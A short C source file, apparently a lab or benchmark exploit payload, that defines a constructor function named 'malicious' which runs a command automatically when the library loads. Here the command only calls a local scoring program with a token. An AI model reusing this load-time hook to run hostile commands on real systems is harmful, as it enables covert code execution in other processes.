#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8c88850d-0397-4369-a225-c54dc7ad5ed2");
}

